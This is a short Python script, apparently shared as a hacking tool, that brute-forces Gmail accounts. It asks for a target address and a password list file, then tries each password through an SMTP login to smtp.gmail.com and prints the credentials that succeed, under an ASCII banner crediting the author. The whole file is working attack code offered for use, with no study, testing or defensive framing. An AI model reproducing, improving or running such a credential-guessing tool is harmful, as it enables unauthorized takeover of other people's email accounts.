#!/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import smtplib

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except smtplib.SMTPAuthenticationError:
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31mTRIED%s " % user + " -> %s \033[1;m" % password ))

print('''\033[1;31m
	
   ______                       _   __    ______                    _          
 .' ___  |                     (_) [  |  |_   _ \                  / |_        
/ .'   \_| _ .--..--.   ,--.   __   | |    | |_) | _ .--.  __   _ `| |-'.---.  
| |   ____[ `.-. .-. | `'_\ : [  |  | |    |  __'.[ `/'`\][  | | | | | / /__\\ 
\ `.___]  || | | | | | // | |, | |  | |   _| |__) || |     | \_/ |,| |,| \__., 
 `._____.'[___||__||__]\'-;__/[___][___] |_______/[___]    '.__.'_/\__/ '.__.' 
     𝙱𝚢:𝚔𝚘𝚒𝚟𝟸.𝚌              ☞𝚃𝚁𝟹𝟹☜                                                                             
''')

instance = GmailBruteForce()

do = input('''
		Click X to start
	
		$𝚃𝚁𝟹𝟹$:''')
############
if do == 'x':
    user = input("Target : ")
    senha = input("LIST: ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1Android(Browser,Firefox,WebView,Chrome,OperaAndroid)(Browser,Firefox,WebView,Chrome,Opera)iOS(Saffari,Firefox,Chrome)Windows Phone(Browser)Blackberry(Browser)Unix(Chrome,Surf,Opera)macOS(Saffari,Firefox,Opera,Chrome,Camino,SeaMonkey))')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()